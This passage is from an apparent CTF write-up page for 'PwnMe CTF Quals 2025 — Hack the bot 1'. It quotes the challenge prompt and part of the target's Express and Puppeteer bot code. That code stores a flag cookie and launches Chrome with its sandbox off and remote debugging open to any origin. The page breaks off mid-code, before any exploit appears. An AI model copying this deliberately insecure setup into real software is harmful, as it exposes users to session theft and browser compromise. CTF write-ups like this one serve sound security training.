<!DOCTYPE html><!--FqfWdJCztNJa3QVRETEoN--><html class="dark scroll-smooth jetbrains_mono_cc80ae23-module__2tkX8G__variable"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/70bc3e132a0a741e-s.p.15008bfb.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/9d840a9b-e1df-4c45-90b5-e9fddd514ea0" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/b74639aa-e387-4e0a-af9c-166eaee374f5" as="image"/><link rel="preload" href="https://gist.github.com/user-attachments/assets/cf486ec9-946e-4c53-b7ee-80f2c4efab81" as="image"/><link rel="stylesheet" href="/_next/static/chunks/0ae28dad4c293945.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/9563dab5ba30607d.js"/><script src="/_next/static/chunks/df3f54071a4ab395.js" async=""></script><script src="/_next/static/chunks/5d5c0b7cd85c39a9.js" async=""></script><script src="/_next/static/chunks/88f90e91bf073dc9.js" async=""></script><script src="/_next/static/chunks/turbopack-448117163d91e6d2.js" async=""></script><script src="/_next/static/chunks/ff1a16fafef87110.js" async=""></script><script src="/_next/static/chunks/d037381d3416c607.js" async=""></script><script src="/_next/static/chunks/44838f11011a9f2d.js" async=""></script><script src="/_next/static/chunks/03f4569ba78edab9.js" async=""></script><script src="/_next/static/chunks/44f6ea3170f4e31a.js" async=""></script><script src="/_next/static/chunks/39b99946d2be6a43.js" async=""></script><script src="/_next/static/chunks/116d3b69f07f8eb7.js" async=""></script><meta name="next-size-adjust" content=""/><title>PwnMe CTF Quals 2025 — Hack the bot 1 | kevin.fish</title><meta name="description" content="I&#x27;ve developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn&#x27;t have time to test the security of my application, could you take care of it ?"/><meta property="og:title" content="PwnMe CTF Quals 2025 — Hack the bot 1"/><meta property="og:description" content="I&#x27;ve developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn&#x27;t have time to test the security of my application, could you take care of it ?"/><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="PwnMe CTF Quals 2025 — Hack the bot 1"/><meta name="twitter:description" content="I&#x27;ve developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn&#x27;t have time to test the security of my application, could you take care of it ?"/><script src="/_next/static/chunks/a6dad97d9634a72d.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><div hidden=""><!--$--><!--/$--></div><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/writeups">← Back to writeups</a><div><main class="text-pretty max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-4 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_ol]:list-decimal [&amp;_ol]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>PwnMe CTF Quals 2025 — Hack the bot 1</h1>
<blockquote>
<p>I&#x27;ve developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn&#x27;t have time to test the security of my application, could you take care of it ?</p>
</blockquote>
<p>We&#x27;re given an express server that looks like this:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0zm22.034 18.276c-.175-1.095-.888-2.015-3.003-2.873-.736-.345-1.554-.585-1.797-1.14-.091-.33-.105-.51-.046-.705.15-.646.915-.84 1.515-.66.39.12.75.42.976.9 1.034-.676 1.034-.676 1.755-1.125-.27-.42-.404-.601-.586-.78-.63-.705-1.469-1.065-2.834-1.034l-.705.089c-.676.165-1.32.525-1.71 1.005-1.14 1.291-.811 3.541.569 4.471 1.365 1.02 3.361 1.244 3.616 2.205.24 1.17-.87 1.545-1.966 1.41-.811-.18-1.26-.586-1.755-1.336l-1.83 1.051c.21.48.45.689.81 1.109 1.74 1.756 6.09 1.666 6.871-1.004.029-.09.24-.705.074-1.65l.046.067zm-8.983-7.245h-2.248c0 1.938-.009 3.864-.009 5.805 0 1.232.063 2.363-.138 2.711-.33.689-1.18.601-1.566.48-.396-.196-.597-.466-.83-.855-.063-.105-.11-.196-.127-.196l-1.825 1.125c.305.63.75 1.172 1.324 1.517.855.51 2.004.675 3.207.405.783-.226 1.458-.691 1.811-1.411.51-.93.402-2.07.397-3.346.012-2.054 0-4.109 0-6.179l.004-.056z"></path></svg> <!-- -->js<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">const</span><span class=""> express </span><span class="token operator">=</span><span class=""> </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#x27;express&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token keyword">const</span><span class=""> path </span><span class="token operator">=</span><span class=""> </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#x27;path&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">const</span><span class=""> fs </span><span class="token operator">=</span><span class=""> </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#x27;fs&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class=""></span><span class="token keyword">const</span><span class=""> </span><span class="token punctuation">{</span><span class=""> spawn </span><span class="token punctuation">}</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#x27;child_process&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class=""></span><span class="token keyword">const</span><span class=""> puppeteer </span><span class="token operator">=</span><span class=""> </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#x27;puppeteer&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class=""></span><span class="token keyword">const</span><span class=""> </span><span class="token punctuation">{</span><span class=""> format </span><span class="token punctuation">}</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#x27;date-fns&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class=""></span><span class="token keyword">const</span><span class=""> app </span><span class="token operator">=</span><span class=""> </span><span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class=""></span><span class="token keyword">const</span><span class=""> port </span><span class="token operator">=</span><span class=""> </span><span class="token number">5000</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class=""></span><span class="token keyword">const</span><span class=""> logPath </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;/tmp/bot_folder/logs/&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token keyword">const</span><span class=""> browserCachePath </span><span class="token operator">=</span><span class=""> </span><span class="token string">&#x27;/tmp/bot_folder/browser_cache/&#x27;</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class=""></span><span class="token keyword">const</span><span class=""> cookie </span><span class="token operator">=</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">    </span><span class="token literal-property property">name</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;Flag&#x27;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">    </span><span class="token literal-property property">value</span><span class="token operator">:</span><span class=""> </span><span class="token string">&quot;PWNME{FAKE_FLAG}&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">    </span><span class="token literal-property property">sameSite</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;Strict&#x27;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">use</span><span class="token punctuation">(</span><span class="">express</span><span class="token punctuation">.</span><span class="token method function property-access">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">extended</span><span class="token operator">:</span><span class=""> </span><span class="token boolean">true</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">use</span><span class="token punctuation">(</span><span class="">express</span><span class="token punctuation">.</span><span class="token method function property-access">static</span><span class="token punctuation">(</span><span class="">path</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="">__dirname</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;public&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">set</span><span class="token punctuation">(</span><span class="token string">&#x27;views&#x27;</span><span class="token punctuation">,</span><span class=""> path</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="">__dirname</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;views&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">app</span><span class="token punctuation">.</span><span class="token method function property-access">set</span><span class="token punctuation">(</span><span class="token string">&#x27;view engine&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;ejs&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">26</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class=""></span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="">fs</span><span class="token punctuation">.</span><span class="token method function property-access">existsSync</span><span class="token punctuation">(</span><span class="">logPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">    fs</span><span class="token punctuation">.</span><span class="token method function property-access">mkdirSync</span><span class="token punctuation">(</span><span class="">logPath</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">recursive</span><span class="token operator">:</span><span class=""> </span><span class="token boolean">true</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">30</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class=""></span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="">fs</span><span class="token punctuation">.</span><span class="token method function property-access">existsSync</span><span class="token punctuation">(</span><span class="">browserCachePath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">    fs</span><span class="token punctuation">.</span><span class="token method function property-access">mkdirSync</span><span class="token punctuation">(</span><span class="">browserCachePath</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">recursive</span><span class="token operator">:</span><span class=""> </span><span class="token boolean">true</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">34</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class=""></span><span class="token keyword">const</span><span class=""> </span><span class="token function-variable function">sleep</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token parameter">ms</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token keyword">new</span><span class=""> </span><span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class=""> </span><span class="token arrow operator">=&gt;</span><span class=""> </span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="">resolve</span><span class="token punctuation">,</span><span class=""> ms</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">36</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class=""></span><span class="token keyword">async</span><span class=""> </span><span class="token keyword">function</span><span class=""> </span><span class="token function">startBot</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token parameter punctuation">,</span><span class="token parameter"> name</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">    </span><span class="token keyword">const</span><span class=""> logFilePath </span><span class="token operator">=</span><span class=""> path</span><span class="token punctuation">.</span><span class="token method function property-access">join</span><span class="token punctuation">(</span><span class="">logPath</span><span class="token punctuation">,</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">name</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">.log</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">39</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">    </span><span class="token keyword control-flow">try</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class="">        </span><span class="token keyword">const</span><span class=""> logStream </span><span class="token operator">=</span><span class=""> fs</span><span class="token punctuation">.</span><span class="token method function property-access">createWriteStream</span><span class="token punctuation">(</span><span class="">logFilePath</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">flags</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;a&#x27;</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">        logStream</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation keyword">new</span><span class="token template-string interpolation"> </span><span class="token template-string interpolation class-name">Date</span><span class="token template-string interpolation punctuation">(</span><span class="token template-string interpolation punctuation">)</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string"> : Attempting to open website </span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">url</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">\n</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">43</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">        </span><span class="token keyword">const</span><span class=""> browser </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> puppeteer</span><span class="token punctuation">.</span><span class="token method function property-access">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">45</span><span class="">            </span><span class="token literal-property property">headless</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;new&#x27;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">            </span><span class="token literal-property property">args</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">[</span><span class="token string">&#x27;--remote-allow-origins=*&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;--no-sandbox&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&#x27;--disable-dev-shm-usage&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">--user-data-dir=</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">browserCachePath</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">        </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">48</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="">        </span><span class="token keyword">const</span><span class=""> page </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> browser</span><span class="token punctuation">.</span><span class="token method function property-access">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">        </span><span class="token keyword control-flow">await</span><span class=""> page</span><span class="token punctuation">.</span><span class="token method function property-access">goto</span><span class="token punctuation">(</span><span class="">url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">51</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">url</span><span class="token punctuation">.</span><span class="token method function property-access">startsWith</span><span class="token punctuation">(</span><span class="token string">&quot;http://localhost/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">53</span><span class="">            </span><span class="token keyword control-flow">await</span><span class=""> page</span><span class="token punctuation">.</span><span class="token method function property-access">setCookie</span><span class="token punctuation">(</span><span class="">cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class="">        </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">55</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">56</span><span class="">        logStream</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation keyword">new</span><span class="token template-string interpolation"> </span><span class="token template-string interpolation class-name">Date</span><span class="token template-string interpolation punctuation">(</span><span class="token template-string interpolation punctuation">)</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string"> : Successfully opened </span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">url</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">\n</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">57</span>        
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">58</span><span class="">        </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">7000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">59</span><span class="">        </span><span class="token keyword control-flow">await</span><span class=""> browser</span><span class="token punctuation">.</span><span class="token method function property-access">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">60</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">61</span><span class="">        logStream</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation keyword">new</span><span class="token template-string interpolation"> </span><span class="token template-string interpolation class-name">Date</span><span class="token template-string interpolation punctuation">(</span><span class="token template-string interpolation punctuation">)</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string"> : Finished execution\n</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">62</span><span class="">        logStream</span><span class="token punctuation">.</span><span class="token method function property-access">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">63</span><span class="">    </span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword control-flow">catch</span><span class=""> </span><span class="token punctuation">(</span><span class="">e</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">64</span><span class="">        </span><span class="token keyword">const</span><span class=""> logStream </span><span class="token operator">=</span><span class=""> fs</span><span class="token punctuation">.</span><span class="token method function property-access">createWriteStream</span><span class="token punctuation">(</span><span class="">logFilePath</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token literal-property property">flags</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;a&#x27;</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">65</span><span class="">        logStream</span><span class="token punctuation">.</span><span class="token method function property-access">write</span><span class="token punctuation">(</span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation keyword">new</span><span class="token template-string interpolation"> </span><span class="token template-string interpolation class-name">Date</span><span class="token template-string interpolation punctuation">(</span><span class="token template-string interpolation punctuation">)</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string"> : Exception occurred: </span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">e</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">\n</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">66</span><span class="">        logStream</span><span class="token punctuation">.</span><span class="token method function property-access">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
